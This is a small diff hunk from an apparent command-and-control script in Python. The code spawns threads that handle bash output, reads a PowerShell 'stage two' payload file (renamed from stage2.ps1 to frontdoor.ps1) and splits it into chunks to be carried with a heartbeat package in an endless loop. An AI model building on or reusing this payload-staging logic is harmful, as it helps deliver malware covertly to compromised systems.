@@ -283,7 +283,7 @@ thread.start_new_thread(process_bash_output, (qout, subproc))
 thread.start_new_thread(process_bash_error, (qout, subproc))
 
 # Initialize stage one payload, carried with heartbeat package in endless loop
-with open("stage2.ps1","rb") as f:
+with open("frontdoor.ps1","rb") as f:
 	stage2=f.read()
 #initial_payload="#Hey this is the test data for an initial payload calling get-date on PS\nGet-Date"
 stage2_chunks = chunks(stage2)
